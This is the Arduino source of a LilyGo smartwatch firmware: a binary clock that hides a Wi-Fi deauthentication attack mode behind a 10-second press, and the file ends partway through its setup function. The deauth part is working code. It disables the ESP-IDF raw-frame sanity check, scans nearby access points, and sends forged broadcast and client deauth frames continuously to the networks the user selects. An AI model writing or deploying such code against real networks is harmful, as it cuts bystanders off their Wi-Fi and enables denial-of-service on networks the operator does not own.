#include <Arduino.h>
#include <LilyGoLib.h>
#include <LV_Helper.h>
#include <time.h>
#include <math.h>
#include <sys/time.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>

// Bypass ESP-IDF WiFi frame sanity check so deauth packets can be sent.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}

LV_FONT_DECLARE(square_18);
static const lv_font_t *kUiFont = &square_18;
static const lv_color_t kUiGreen = lv_color_hex(0x00FF66);

static lv_obj_t *label;
static lv_obj_t *settingPanel;
static lv_obj_t *batteryPanel;
static lv_obj_t *batteryChars[10];

static bool binaryMode = true;
static bool screenOn = true;
static bool sensorReady = false;
static bool sensorWarned = false;
static bool settingMode = false;
static uint8_t settingField = 0;

// Deauth
static bool deauthMode = false;
static bool attackInProgress = false;
static bool stopAttackRequested = false;
static uint32_t packetSendDelayMs = 40;
static uint32_t attackNextPacketMs = 0;
static uint32_t attackPacketCount = 0;
static size_t attackCursor = 0;
static int attackSelectedCount = 0;
static int attackCurrentSelectedIndex = 0;
typedef struct {
    String ssid;
    uint8_t bssid[6];
    int channel;
    int rssi;
    bool selected;
} ap_info_t;
static std::vector<ap_info_t> apList;
static lv_obj_t *deauthPanel = nullptr;
static lv_obj_t *deauthContainer = nullptr;
static lv_obj_t *deauthStatusLabel = nullptr;
static lv_obj_t *scanButtonLabel = nullptr;
static lv_obj_t *attackButtonLabel = nullptr;
static std::vector<lv_obj_t*> deauthCheckboxes;

static bool wifiScanRequested = false;
static bool wifiScanActive = false;
static uint8_t wifiScanStep = 0;
static uint8_t wifiScanRetries = 0;
static uint32_t wifiScanStartMs = 0;
static uint32_t wifiScanUiMs = 0;
static uint32_t wifiScanPrepareMs = 0;

static const uint8_t kWifiScanMaxRetries = 3;

static uint32_t lastMotionMs = 0;
static uint32_t lastTickMs = 0;
static uint32_t lastBatteryAnimMs = 0;
static uint32_t pressStartMs = 0;
static uint32_t lastHoldTriggerMs = 0;

static int16_t touchStartX = 0;
static int16_t touchStartY = 0;
static bool touchPressed = false;

static uint8_t batteryAnimPhase = 0;
static bool batteryBlinkOn = false;
static bool hasSystemTime = false;

static struct tm curTm = {
    .tm_sec  = 32,
    .tm_min  = 53,
    .tm_hour = 21,
    .tm_mday = 31,
    .tm_mon  = 9,
    .tm_year = 125,
    .tm_wday = 5,
    .tm_yday = 303,
    .tm_isdst = 0
};

static float lastAx = 0.0f, lastAy = 0.0f, lastAz = 1.0f;

enum SettingAction : uint8_t {
    ACTION_FIELD_NEXT = 0,
    ACTION_INC = 1,
    ACTION_DEC = 2,
    ACTION_SAVE = 3,
    ACTION_EXIT = 4
};

// forward
static void wakeScreen();
static void sleepScreen();
static void updateSettingPanel();
static void updateTimeDisplay();
static void refreshTime();
static bool detectWristRaise();
static void device_event_cb(DeviceEvent_t event, void *params, void *user_data);
static void touch_event_cb(lv_event_t *e);
static void enterDeauthMode();
static void exitDeauthMode();
static void requestWifiScan();
static void processWifiScan();
static void updateDeauthUI();
static void setStatusMessage(const char *text);
static void setScanButtonLabel(const char *text);
static void setAttackButtonLabel(const char *text);
static void flushDeauthUI();
static void updateSelectedCountText();
static void sendDeauthPacket(uint8_t* bssid, uint8_t channel);
static void deauthSelected();
static void deauth_btn_event_cb(lv_event_t *e);

// ---------- utility ----------
static String toBinary(uint32_t value, uint8_t bits) {
    String out;
    out.reserve(bits);
    for (int i = bits - 1; i >= 0; --i)
        out += ((value >> i) & 1U) ? '1' : '0';
    return out;
}

static String formatField(int value, uint8_t width, bool selected) {
    char tmp[12];
    snprintf(tmp, sizeof(tmp), "%0*d", width, value);
    if (!selected) return String(tmp);
    String out = "[";
    out += tmp;
    out += "]";
    return out;
}

static int mappedWday() {
    return (curTm.tm_wday == 0) ? 1 : curTm.tm_wday + 1;
}

static const char *dowName(int wday) {
    static const char *names[] = {"Sun","Mon","Tue","Wed","Thu","Fri","Sat"};
    return (wday < 0 || wday > 6) ? "???" : names[wday];
}

// ---------- screen ----------
static void wakeScreen() {
    if (!screenOn) {
        instance.setBrightness(DEVICE_MAX_BRIGHTNESS_LEVEL);
        screenOn = true;
    }
    lastMotionMs = millis();
}

static void sleepScreen() {
    if (screenOn) {
        instance.setBrightness(0);
        screenOn = false;
    }
}

// ---------- time ----------
static void normalizeTime() {
    time_t raw = mktime(&curTm);
    localtime_r(&raw, &curTm);
}

static void saveTimeToRtcAndSystem() {
    normalizeTime();
    RTC_DateTime rtcTime(
        (uint16_t)(curTm.tm_year + 1900),
        (uint8_t)(curTm.tm_mon + 1),
        (uint8_t)curTm.tm_mday,
        (uint8_t)curTm.tm_hour,
        (uint8_t)curTm.tm_min,
        (uint8_t)curTm.tm_sec,
        (uint8_t)curTm.tm_wday
    );
    instance.rtc.setDateTime(rtcTime);
    time_t raw = mktime(&curTm);
    struct timeval tv = {.tv_sec = raw, .tv_usec = 0};
    settimeofday(&tv, nullptr);
    hasSystemTime = true;
}

static void incrementCurrentField() {
    switch (settingField) {
        case 0: curTm.tm_mday++; break;
        case 1: curTm.tm_mon++;  break;
        case 2: curTm.tm_year++; break;
        case 3: curTm.tm_hour++; break;
        case 4: curTm.tm_min++;  break;
        case 5: curTm.tm_sec++;  break;
    }
    normalizeTime();
}

static void decrementCurrentField() {
    switch (settingField) {
        case 0: curTm.tm_mday--; break;
        case 1: curTm.tm_mon--;  break;
        case 2: curTm.tm_year--; break;
        case 3: curTm.tm_hour--; break;
        case 4: curTm.tm_min--;  break;
        case 5: curTm.tm_sec--;  break;
    }
    normalizeTime();
}

static void updateSettingPanel() {
    if (!settingPanel) return;
    if (settingMode) lv_obj_clear_flag(settingPanel, LV_OBJ_FLAG_HIDDEN);
    else lv_obj_add_flag(settingPanel, LV_OBJ_FLAG_HIDDEN);
}

static void tickFallbackTime() {
    time_t raw = mktime(&curTm);
    raw += 1;
    localtime_r(&raw, &curTm);
}

static void refreshTime() {
    if (settingMode) return;
    struct tm now;
    if (getLocalTime(&now, 10)) {
        curTm = now;
        hasSystemTime = true;
    } else {
        tickFallbackTime();
    }
}

static void updateTimeDisplay() {
    if (!label) return;
    String text;
    if (binaryMode) {
        text.reserve(160);
        text += toBinary((uint32_t)mappedWday(), 6);
        text += " / ";
        text += toBinary((uint32_t)curTm.tm_mday, 6);
        text += " / ";
        text += toBinary((uint32_t)(curTm.tm_mon + 1), 6);
        text += "\n";
        text += toBinary((uint32_t)curTm.tm_hour, 6);
        text += " : ";
        text += toBinary((uint32_t)curTm.tm_min, 6);
        text += " : ";
        text += toBinary((uint32_t)curTm.tm_sec, 6);
        text += "\n";
        text += toBinary((uint32_t)((curTm.tm_year + 1900) % 100), 6);
    } else {
        text.reserve(160);
        text += dowName(curTm.tm_wday);
        text += " / ";
        text += formatField(curTm.tm_mday, 2, settingMode && settingField == 0);
        text += " / ";
        text += formatField(curTm.tm_mon + 1, 2, settingMode && settingField == 1);
        text += "\n";
        text += formatField(curTm.tm_hour, 2, settingMode && settingField == 3);
        text += " : ";
        text += formatField(curTm.tm_min, 2, settingMode && settingField == 4);
        text += " : ";
        text += formatField(curTm.tm_sec, 2, settingMode && settingField == 5);
        text += "\n";
        text += formatField(curTm.tm_year + 1900, 4, settingMode && settingField == 2);
    }
    lv_label_set_text(label, text.c_str());
}

// ---------- battery ----------
static int getBatteryBarCount(int batteryPercent) {
    if (batteryPercent < 0) return 0;
    if (batteryPercent > 100) batteryPercent = 100;
    int bars = batteryPercent / 10;
    if (batteryPercent > 0 && bars == 0) bars = 1;
    return bars;
}

static void updateBatteryDisplay() {
    if (!batteryPanel) return;
    bool chargingNow = instance.pmu.isVbusIn() && instance.pmu.isCharging();
    int batteryPercent = instance.pmu.getBatteryPercent();
    int visibleBars = getBatteryBarCount(batteryPercent);

    if (batteryPercent < 0) {
        for (int i = 0; i < 10; ++i) {
            lv_label_set_text(batteryChars[i], "");
            lv_obj_set_style_text_opa(batteryChars[i], LV_OPA_TRANSP, 0);
        }
        return;
    }
    if (visibleBars > 10) visibleBars = 10;

    if (!chargingNow) {
        batteryBlinkOn = false;
        batteryAnimPhase = 0;
        for (int i = 0; i < 10; ++i) {
            if (i < visibleBars) {
                lv_label_set_text(batteryChars[i], "<");
                lv_obj_set_style_text_opa(batteryChars[i], LV_OPA_COVER, 0);
            } else {
                lv_label_set_text(batteryChars[i], "");
                lv_obj_set_style_text_opa(batteryChars[i], LV_OPA_TRANSP, 0);
            }
        }
        return;
    }

    const uint32_t BATTERY_ANIM_INTERVAL_MS = 320;
    if (millis() - lastBatteryAnimMs >= BATTERY_ANIM_INTERVAL_MS) {
        lastBatteryAnimMs = millis();
        batteryAnimPhase++;
        if (visibleBars == 1) batteryBlinkOn = !batteryBlinkOn;
    }

    if (visibleBars <= 0) {
        for (int i = 0; i < 10; ++i) {
            lv_label_set_text(batteryChars[i], "");
            lv_obj_set_style_text_opa(batteryChars[i], LV_OPA_TRANSP, 0);
        }
        return;
    }

    if (visibleBars == 1) {
        lv_label_set_text(batteryChars[0], "<");
        lv_obj_set_style_text_opa(batteryChars[0], batteryBlinkOn ? LV_OPA_COVER : LV_OPA_TRANSP, 0);
        for (int i = 1; i < 10; ++i) {
            lv_label_set_text(batteryChars[i], "");
            lv_obj_set_style_text_opa(batteryChars[i], LV_OPA_TRANSP, 0);
        }
        return;
    }

    int activeIndex = batteryAnimPhase % visibleBars;
    for (int i = 0; i < 10; ++i) {
        if (i < visibleBars) {
            lv_label_set_text(batteryChars[i], "<");
            lv_obj_set_style_text_opa(batteryChars[i], (i == activeIndex) ? LV_OPA_COVER : LV_OPA_50, 0);
        } else {
            lv_label_set_text(batteryChars[i], "");
            lv_obj_set_style_text_opa(batteryChars[i], LV_OPA_TRANSP, 0);
        }
    }
}

// ---------- sensor ----------
static bool detectWristRaise() {
    if (!sensorReady) return false;
    int16_t rx, ry, rz;
    if (!instance.sensor.getAccelerometer(rx, ry, rz)) return false;
    float ax = rx / 1024.0f, ay = ry / 1024.0f, az = rz / 1024.0f;
    float mag = sqrtf(ax*ax + ay*ay + az*az);
    if (mag < 0.20f) return false;
    ax /= mag; ay /= mag; az /= mag;
    float diff = fabsf(ax - lastAx) + fabsf(ay - lastAy) + fabsf(az - lastAz);
    lastAx = ax; lastAy = ay; lastAz = az;
    return (diff > 0.30f) && (fabsf(az) < 0.78f);
}

// ---------- setting mode ----------
static void toggleSettingMode() {
    settingMode = !settingMode;
    if (settingMode) binaryMode = false;
    wakeScreen();
    updateSettingPanel();
    updateTimeDisplay();
}

// ---------- deauth ----------
static void enterDeauthMode() {
    if (deauthMode) return;
    deauthMode = true;
    attackInProgress = false;
    stopAttackRequested = false;
    attackNextPacketMs = 0;
    attackPacketCount = 0;
    attackCursor = 0;
    attackSelectedCount = 0;
    attackCurrentSelectedIndex = 0;
    wakeScreen();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    lv_obj_add_flag(settingPanel, LV_OBJ_FLAG_HIDDEN);
    if (deauthPanel) lv_obj_clear_flag(deauthPanel, LV_OBJ_FLAG_HIDDEN);
    if (deauthContainer) lv_obj_add_flag(deauthContainer, LV_OBJ_FLAG_HIDDEN);
    apList.clear();
    if (deauthStatusLabel) {
        lv_label_set_text(deauthStatusLabel, "Tap Scan to start.");
    }
    flushDeauthUI();
}

static void exitDeauthMode() {
    deauthMode = false;
    attackInProgress = false;
    stopAttackRequested = true;
    wifiScanRequested = false;
    wifiScanActive = false;
    wifiScanStep = 0;
    wifiScanRetries = 0;
    wifiScanPrepareMs = 0;
    esp_wifi_set_promiscuous(false);
    attackNextPacketMs = 0;
    attackPacketCount = 0;
    attackCursor = 0;
    attackSelectedCount = 0;
    attackCurrentSelectedIndex = 0;
    if (deauthContainer) lv_obj_add_flag(deauthContainer, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(deauthPanel, LV_OBJ_FLAG_HIDDEN);
    updateSettingPanel();
    updateTimeDisplay();
    wakeScreen();
}

static void flushDeauthUI() {
    instance.loop();
    lv_timer_handler();
    lv_refr_now(NULL);
}

static void requestWifiScan() {
    if (wifiScanActive) return;
    wifiScanRequested = true;
}

static void resetWifiScanState() {
    wifiScanActive = false;
    wifiScanStep = 0;
    wifiScanPrepareMs = 0;
}

static void beginWifiScanReset(uint32_t now) {
    esp_wifi_set_promiscuous(false);
    attackInProgress = false;
    stopAttackRequested = false;
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    wifiScanStep = 1;
    wifiScanPrepareMs = now;
}

static String formatApLabel(const ap_info_t &ap) {
    if (ap.ssid.length() > 0) return ap.ssid;
    char buf[32];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             ap.bssid[0], ap.bssid[1], ap.bssid[2],
             ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    return String(buf);
}

static bool apAlreadyListed(const uint8_t *bssid) {
    for (const auto &existing : apList) {
        if (memcmp(existing.bssid, bssid, 6) == 0) return true;
    }
    return false;
}

static void finishWifiScan(int n) {
    resetWifiScanState();

    if (n < 0) {
        setScanButtonLabel("Scan");
        setStatusMessage("Scan failed. Tap Scan.");
        updateDeauthUI();
        return;
    }

    apList.clear();
    for (int i = 0; i < n; i++) {
        uint8_t* bssid = WiFi.BSSID(i);
        if (!bssid || apAlreadyListed(bssid)) continue;

        ap_info_t ap;
        ap.ssid = WiFi.SSID(i);
        ap.rssi = WiFi.RSSI(i);
        ap.channel = WiFi.channel(i);
        ap.selected = false;
        memcpy(ap.bssid, bssid, 6);
        apList.push_back(ap);
    }
    WiFi.scanDelete();

    setScanButtonLabel("Scan");
    if (apList.empty()) {
        setStatusMessage("Scan complete. No AP found");
    } else {
        char buf[80];
        snprintf(buf, sizeof(buf), "Scan complete. Found %d APs", (int)apList.size());
        setStatusMessage(buf);
    }
    updateDeauthUI();
}

static void runSyncWifiScanFallback() {
    setStatusMessage("Scanning... final attempt");
    flushDeauthUI();
    int n = WiFi.scanNetworks(false, true, false, 310);
    finishWifiScan(n);
}

static void processWifiScan() {
    uint32_t now = millis();

    if (wifiScanRequested && !wifiScanActive) {
        wifiScanRequested = false;
        wifiScanActive = true;
        wifiScanRetries = 0;
        wifiScanStartMs = now;
        wifiScanUiMs = 0;
        setAttackButtonLabel("Attack");
        setStatusMessage("Scanning... Please wait");
        lv_obj_clear_flag(deauthContainer, LV_OBJ_FLAG_HIDDEN);
        flushDeauthUI();
        beginWifiScanReset(now);
    }

    if (!wifiScanActive) return;

    if (now - wifiScanUiMs >= 250) {
        wifiScanUiMs = now;
        char buf[64];
        snprintf(buf, sizeof(buf), "Scanning... %lus", (now - wifiScanStartMs) / 1000);
        if (deauthStatusLabel) lv_label_set_text(deauthStatusLabel, buf);
        flushDeauthUI();
    }

    if (wifiScanStep == 1) {
        if (now - wifiScanPrepareMs < 300) return;
        WiFi.mode(WIFI_STA);
        WiFi.disconnect(true, false);
        wifiScanStep = 2;
        wifiScanPrepareMs = now;
        return;
    }

    if (wifiScanStep == 2) {
        if (now - wifiScanPrepareMs < 400) return;
        int ret = WiFi.scanNetworks(true, true, false, 310);
        if (ret == WIFI_SCAN_RUNNING) {
            wifiScanStep = 3;
            wifiScanStartMs = now;
            return;
        }
        if (ret >= 0) {
            finishWifiScan(ret);
            return;
        }

        wifiScanRetries++;
        if (wifiScanRetries < kWifiScanMaxRetries) {
            beginWifiScanReset(now);
        } else {
            runSyncWifiScanFallback();
        }
        return;
    }

    if (wifiScanStep == 3) {
        int n = WiFi.scanComplete();
        if (n == WIFI_SCAN_RUNNING) {
            if (now - wifiScanStartMs > 20000) {
                WiFi.scanDelete();
                wifiScanRetries++;
                if (wifiScanRetries < kWifiScanMaxRetries) {
                    setStatusMessage("Scan retry...");
                    beginWifiScanReset(now);
                } else {
                    resetWifiScanState();
                    setScanButtonLabel("Scan");
                    setStatusMessage("Scan timeout");
                    flushDeauthUI();
                }
            }
            return;
        }

        if (n == WIFI_SCAN_FAILED) {
            WiFi.scanDelete();
            wifiScanRetries++;
            if (wifiScanRetries < kWifiScanMaxRetries) {
                beginWifiScanReset(now);
            } else {
                runSyncWifiScanFallback();
            }
            return;
        }

        finishWifiScan(n);
    }
}

static void setStatusMessage(const char *text) {
    if (!deauthStatusLabel) return;
    lv_label_set_text(deauthStatusLabel, text);
    lv_obj_invalidate(deauthStatusLabel);
    flushDeauthUI();
}

static void setScanButtonLabel(const char *text) {
    if (!scanButtonLabel) return;
    lv_label_set_text(scanButtonLabel, text);
    lv_obj_invalidate(scanButtonLabel);
    flushDeauthUI();
}

static void setAttackButtonLabel(const char *text) {
    if (!attackButtonLabel) return;
    lv_label_set_text(attackButtonLabel, text);
    lv_obj_invalidate(attackButtonLabel);
    flushDeauthUI();
}

static void updateDeauthUI() {
    if (!deauthContainer) return;
    for (auto chk : deauthCheckboxes) lv_obj_del(chk);
    deauthCheckboxes.clear();

    if (!deauthMode) {
        if (deauthContainer) lv_obj_add_flag(deauthContainer, LV_OBJ_FLAG_HIDDEN);
        return;
    }

    if (deauthContainer) lv_obj_clear_flag(deauthContainer, LV_OBJ_FLAG_HIDDEN);
    for (size_t i = 0; i < apList.size(); i++) {
        lv_obj_t *chk = lv_checkbox_create(deauthContainer);
        lv_checkbox_set_text(chk, formatApLabel(apList[i]).c_str());
        lv_obj_set_user_data(chk, (void*)i);
        lv_obj_set_style_bg_color(chk, lv_color_black(), LV_PART_MAIN);
        lv_obj_set_style_bg_opa(chk, LV_OPA_COVER, LV_PART_MAIN);
        lv_obj_set_style_border_color(chk, kUiGreen, LV_PART_MAIN);
        lv_obj_set_style_border_width(chk, 1, LV_PART_MAIN);
        lv_obj_set_style_text_color(chk, kUiGreen, LV_PART_MAIN);
        lv_obj_set_style_text_font(chk, kUiFont, LV_PART_MAIN);
        lv_obj_set_style_pad_column(chk, 2, LV_PART_MAIN);
        lv_obj_set_style_bg_color(chk, lv_color_black(), LV_PART_INDICATOR);
        lv_obj_set_style_bg_opa(chk, LV_OPA_TRANSP, LV_PART_INDICATOR);
        lv_obj_set_style_border_color(chk, lv_color_black(), LV_PART_INDICATOR);
        lv_obj_set_style_border_width(chk, 1, LV_PART_INDICATOR);
        lv_obj_set_style_bg_color(chk, kUiGreen, LV_PART_INDICATOR | LV_STATE_CHECKED);
        lv_obj_set_style_bg_opa(chk, LV_OPA_COVER, LV_PART_INDICATOR | LV_STATE_CHECKED);
        lv_obj_set_style_border_color(chk, kUiGreen, LV_PART_INDICATOR | LV_STATE_CHECKED);
        lv_obj_set_style_border_width(chk, 1, LV_PART_INDICATOR | LV_STATE_CHECKED);
        lv_obj_set_style_text_color(chk, lv_color_black(), LV_PART_INDICATOR | LV_STATE_CHECKED);
        lv_obj_add_event_cb(chk, [](lv_event_t *e) {
            lv_obj_t *obj = (lv_obj_t*)lv_event_get_target(e);
            size_t idx = (size_t)lv_obj_get_user_data(obj);
            if (idx < apList.size()) {
                apList[idx].selected = !apList[idx].selected;
                updateSelectedCountText();
            }
        }, LV_EVENT_CLICKED, NULL);
        deauthCheckboxes.push_back(chk);
    }

    if (apList.empty()) {
        setStatusMessage("No AP found. Tap Scan.");
    }
}

// Helper để set checkbox checked/unchecked
static void setCheckboxChecked(lv_obj_t *chk, bool checked) {
    if (checked)
        lv_obj_add_state(chk, LV_STATE_CHECKED);
    else
        lv_obj_clear_state(chk, LV_STATE_CHECKED);
}

static void setAttackStatusMessage(const ap_info_t &ap, int currentIndex, int selectedCount, uint32_t packetCount) {
    char bssidStr[24];
    snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    char buf[260];
    snprintf(buf, sizeof(buf),
             "Sending deauth\nTarget %d/%d\nSSID: %s\nBSSID: %s\nCh:%d RSSI:%d\nPackets:%lu",
             currentIndex,
             selectedCount,
             ap.ssid.c_str(),
             bssidStr,
             ap.channel,
             ap.rssi,
             packetCount);
    setStatusMessage(buf);
}

static void sendDeauthPacket(uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t deauthBroadcast[26] = {
        0xC0, 0x00,
        0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(&deauthBroadcast[10], bssid, 6);
    memcpy(&deauthBroadcast[16], bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, deauthBroadcast, sizeof(deauthBroadcast), false);

    uint8_t deauthClient[26] = {
        0xC0, 0x00,
        0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x01, 0x00
    };
    uint8_t staMac[6];
    esp_read_mac(staMac, ESP_MAC_WIFI_STA);
    memcpy(&deauthClient[4], staMac, 6);
    memcpy(&deauthClient[10], bssid, 6);
    memcpy(&deauthClient[16], bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, deauthClient, sizeof(deauthClient), false);
}

static void deauthSelected() {
    if (apList.empty()) return;
    if (attackInProgress) {
        stopAttackRequested = true;
        setStatusMessage("Stopping attack...");
        return;
    }

    attackSelectedCount = 0;
    for (const auto &ap : apList) {
        if (ap.selected) ++attackSelectedCount;
    }

    if (attackSelectedCount == 0) {
        setStatusMessage("No AP selected");
        return;
    }

    attackInProgress = true;
    stopAttackRequested = false;
    attackPacketCount = 0;
    attackCursor = 0;
    attackCurrentSelectedIndex = 0;
    attackNextPacketMs = millis();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    setAttackButtonLabel("Stop");
    char buf[160];
    snprintf(buf, sizeof(buf), "Attack started...\nTargets: %d\nPackets will be sent continuously", attackSelectedCount);
    setStatusMessage(buf);
    if (deauthContainer) lv_obj_add_flag(deauthContainer, LV_OBJ_FLAG_HIDDEN);
}

static void updateSelectedCountText() {
    if (attackInProgress) return;
    int count = 0;
    for (const auto &ap : apList) {
        if (ap.selected) ++count;
    }
    if (!deauthStatusLabel) return;
    char buf[64];
    snprintf(buf, sizeof(buf), "Selected: %d AP", count);
    if (count != 1) {
        snprintf(buf, sizeof(buf), "Selected: %d APs", count);
    }
    setStatusMessage(buf);
}

static void deauth_btn_event_cb(lv_event_t *e) {
    if (lv_event_get_code(e) != LV_EVENT_CLICKED) return;
    lv_obj_t *btn = (lv_obj_t*)lv_event_get_target(e);
    int action = (int)(uintptr_t)lv_event_get_user_data(e);
    switch (action) {
        case 0:
            requestWifiScan();
            break;
        case 1:
            if (attackInProgress) {
                stopAttackRequested = true;
                setStatusMessage("Stopping attack...");
            } else {
                deauthSelected();
            }
            break;
        case 2:
            stopAttackRequested = true;
            exitDeauthMode();
            break;
        default: break;
    }
}

// ---------- touch ----------
static void touch_event_cb(lv_event_t *e) {
    lv_event_code_t code = lv_event_get_code(e);
    uint32_t now = millis();
    lv_indev_t *indev = lv_indev_get_act();
    lv_point_t p = {0,0};
    if (indev) lv_indev_get_point(indev, &p);

    if (code == LV_EVENT_PRESSED) {
        touchPressed = true;
        pressStartMs = now;
        touchStartX = p.x;
        touchStartY = p.y;
        return;
    }

    if (code == LV_EVENT_PRESSING) {
        if (touchPressed && pressStartMs != 0) {
            uint32_t elapsed = now - pressStartMs;
            // 10s -> deauth mode (ưu tiên hơn setting mode)
            if (elapsed >= 10000 && (now - lastHoldTriggerMs > 800)) {
                if (!deauthMode) {
                    enterDeauthMode();
                    lastHoldTriggerMs = now;
                    pressStartMs = 0;
                }
                return;
            }
            // 5s -> setting mode
            if (elapsed >= 5000 && (now - lastHoldTriggerMs > 800) && !deauthMode && !settingMode) {
                toggleSettingMode();
                lastHoldTriggerMs = now;
            }
        }
        return;
    }

    if (code == LV_EVENT_DOUBLE_CLICKED) {
        wakeScreen();
        if (settingMode) {
            settingField = (settingField + 1) % 6;
            updateTimeDisplay();
        } else if (!deauthMode) {
            binaryMode = !binaryMode;
            updateTimeDisplay();
        }
        return;
    }

    if (code == LV_EVENT_RELEASED) {
        if (touchPressed && settingMode) {
            int dx = p.x - touchStartX;
            int dy = p.y - touchStartY;
            const int SWIPE_MIN_Y = 18;
            const int SWIPE_MAX_X = 12;
            if (abs(dy) >= SWIPE_MIN_Y && abs(dx) <= SWIPE_MAX_X && abs(dy) > abs(dx)) {
                if (dy < 0) incrementCurrentField();
                else decrementCurrentField();
                wakeScreen();
                updateTimeDisplay();
            }
        }
        touchPressed = false;
        pressStartMs = 0;
    }
}

// ---------- setting buttons ----------
static void setting_btn_event_cb(lv_event_t *e) {
    if (lv_event_get_code(e) != LV_EVENT_CLICKED || !settingMode) return;
    SettingAction action = (SettingAction)(uintptr_t)lv_event_get_user_data(e);
    switch (action) {
        case ACTION_FIELD_NEXT: settingField = (settingField + 1) % 6; break;
        case ACTION_INC: incrementCurrentField(); break;
        case ACTION_DEC: decrementCurrentField(); break;
        case ACTION_SAVE: saveTimeToRtcAndSystem(); settingMode = false; break;
        case ACTION_EXIT: settingMode = false; refreshTime(); break;
    }
    wakeScreen();
    updateSettingPanel();
    updateTimeDisplay();
}

// ---------- device event ----------
static void device_event_cb(DeviceEvent_t event, void *params, void *user_data) {
    (void)user_data;
    if (event != SENSOR_EVENT) return;
    switch (instance.getSensorEventType(params)) {
        case SENSOR_TILT_DETECTED:
        case SENSOR_DOUBLE_TAP_DETECTED:
            wakeScreen();
            break;
        default: break;
    }
}

static void addTouchBubble(lv_obj_t *obj) {
    if (obj) lv_obj_add_flag(obj, LV_OBJ_FLAG_EVENT_BUBBLE);
}

// ---------- setup ----------
void setup() {
    Serial.begin(115200);
    instance.begin();
    beginLvglHelper(instance);

    // sensor
    instance.sensor.configAccelerometer();
    instance.sensor.enableAccelerometer();
    instance.sensor.setRemapAxes(SensorBMA423::REMAP_BOTTOM_LAYER_TOP_RIGHT_CORNER);
    instance.sensor.enableFeature(SensorBMA423::FEATURE_TILT, true);
    instance.sensor.enableTiltIRQ();
    instance.sensor.enableFeature(SensorBMA423::FEATURE_WAKEUP, true);
    instance.sensor.enableWakeupIRQ();
    instance.sensor.disablePedometerIRQ();
    instance.sensor.disableActivityIRQ();
    instance.sensor.disableAnyNoMotionIRQ();
    instance.sensor.disableTiltIRQ();
    instance.sensor.enableTiltIRQ();
    instance.sensor.readIrqStatus();
    instance.onEvent(device_event_cb);

    // screen
    lv_obj_t *scr = lv_screen_active();
    lv_obj_set_style_bg_color(scr, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(scr, LV_OPA_COVER, 0);
    lv_obj_add_flag(scr, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(scr, touch_event_cb, LV_EVENT_PRESSED, NULL);
    lv_obj_add_event_cb(scr, touch_event_cb, LV_EVENT_PRESSING, NULL);
    lv_obj_add_event_cb(scr, touch_event_cb, LV_EVENT_RELEASED, NULL);
    lv_obj_add_event_cb(scr, touch_event_cb, LV_EVENT_DOUBLE_CLICKED, NULL);
    addTouchBubble(scr);

    // main label
    label = lv_label_create(scr);
    lv_obj_set_style_text_color(label, kUiGreen, 0);
    lv_obj_set_style_text_font(label, kUiFont, 0);
    lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_width(label, lv_pct(100));
    lv_obj_set_style_pad_top(label, 20, 0);
    lv_obj_set_style_pad_bottom(label, 20, 0);
    lv_obj_center(label);
    addTouchBubble(label);

    // battery
    batteryPanel = lv_obj_create(scr);
    lv_obj_set_size(batteryPanel, 110, 24);
    lv_obj_align(batteryPanel, LV_ALIGN_TOP_RIGHT, -4, 4);
    lv_obj_set_style_bg_color(batteryPanel, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(batteryPanel, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(batteryPanel, 0, 0);
    lv_obj_set_style_shadow_width(batteryPanel, 0, 0);
    lv_obj_set_style_pad_all(batteryPanel, 0, 0);
    lv_obj_set_style_pad_column(batteryPanel, 1, 0);
    lv_obj_set_style_pad_row(batteryPanel, 0, 0);
    lv_obj_set_style_radius(batteryPanel, 0, 0);
    lv_obj_set_flex_flow(batteryPanel, LV_FLEX_FLOW_ROW_REVERSE);
    lv_obj_set_flex_align(batteryPanel, LV_FLEX_ALIGN_END, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    addTouchBubble(batteryPanel);
    for (int i = 0; i < 10; ++i) {
        batteryChars[i] = lv_label_create(batteryPanel);
        lv_label_set_text(batteryChars[i], "");
        lv_obj_set_style_text_color(batteryChars[i], kUiGreen, 0);
        lv_obj_set_style_text_font(batteryChars[i], kUiFont, 0);
        lv_obj_set_style_text_opa(batteryChars[i], LV_OPA_TRANSP, 0);
        addTouchBubble(batteryChars[i]);
    }

    // setting panel
    settingPanel = lv_obj_create(scr);
    lv_obj_set_size(settingPanel, 232, 34);
    lv_obj_align(settingPanel, LV_ALIGN_BOTTOM_MID, 0, -4);
    lv_obj_set_style_bg_color(settingPanel, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(settingPanel, LV_OPA_COVER, 0);
    lv_obj_set_style_border_color(settingPanel, kUiGreen, 0);
    lv_obj_set_style_border_width(settingPanel, 1, 0);
    lv_obj_set_style_shadow_width(settingPanel, 0, 0);
    lv_obj_set_style_radius(settingPanel, 6, 0);
